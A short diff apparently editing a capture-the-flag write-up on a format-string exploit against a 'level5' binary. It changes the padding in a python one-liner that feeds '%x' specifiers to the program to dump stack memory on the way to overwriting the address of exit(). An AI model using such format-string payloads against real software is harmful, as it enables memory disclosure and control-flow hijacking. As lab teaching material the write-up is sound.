@@ -44,7 +44,7 @@ Now we have the address of `exit()`: `0x08049838` and the address of `o()`: `0x0
 
 We need to print the memory until we reach the address of `exit()`:
 ```
- python -c 'print "aaaa" + " %x" * 10' > /tmp/payload5
+ python -c 'print "AAAA" + " %x" * 10' > /tmp/payload5
  cat /tmp/payload5 | ./level5
  aaaa 200 b7fd1ac0 b7ff37d0 61616161 25207825 78252078 20782520 25207825 78252078 20782520
 ```
